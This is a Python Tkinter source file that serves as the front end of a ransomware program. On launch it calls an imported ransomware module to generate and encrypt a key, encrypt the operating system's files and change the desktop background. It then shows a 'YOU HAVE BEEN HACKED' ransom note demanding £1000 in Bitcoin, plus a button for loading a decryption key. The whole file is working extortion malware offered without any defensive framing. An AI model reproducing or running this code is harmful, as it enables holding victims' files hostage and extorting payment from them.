from tkinter import font, filedialog, messagebox
from tkinter.constants import BOTTOM, END, LEFT
from typing import Sized
import ransomware
import tkinter as tk
import sys
import os
#import PIL 


class Application:
    def __init__(self, master):
        self.master = master
        
        self.malware = ransomware.Ransomware()
        self.malware.create_fernet_key()
        self.malware.encrypt_fernet_key()
        self.malware.encrypt_os()
        self.malware.update_background()

        master.geometry('900x650')
        master.title('Ransomware')
        master.configure(bg='darkred')
        self.message = '''
        YOU HAVE BEEN HACKED.
        All your files have been encrypted with the strongest technology that exists.
        If you attempt in any way to recover your files; they will be damaged and
        unrecoverable forever. The only way to recover your files is to transfer
        £1000 in Bitcoin to the provided address.
        Then send an email to XXX@protonmail.com with a receipt to recieve the
        decryption key in return.

        Input the key in the field below and click the "Decrypt Files" button.
        '''
        
        self.top_frame = tk.Frame(master, bg='darkgrey', height=120, width=900)
        self.top_frame.pack()

        self.middle_frame = tk.Frame(master, bg='blue', width=750)
        self.middle_frame.pack()
        self.info_label = tk.Label(self.middle_frame, text=self.message, font='ubuntu 17')
        self.info_label.pack()
        
        self.bottom_frame = tk.Frame(master, bg='purple')
        self.bottom_frame.pack(side=BOTTOM)
        self.bottom_lbl = tk.Label(self.bottom_frame, text='Import Decryption key:')
        self.bottom_lbl.pack(side=LEFT)
        self.bottom_btn = tk.Button(self.bottom_frame, text='Decrypt\nFiles', command=self.uploadAction)
        self.bottom_btn.pack(side=LEFT)


    def uploadAction(self, event=None):
        filename = filedialog.askopenfilename()
        if self.malware.decrypt_fernet_key(filename):
            messagebox.showinfo("Success!", "Your files have been decrypted!")
            self.malware.decrypt_os()
        else:
            messagebox.showerror("Failed!", "You have imported the wrong private key.")
            

def main():
    root = tk.Tk()
    app = Application(master=root)
    root.mainloop()

if __name__ == '__main__':
    main()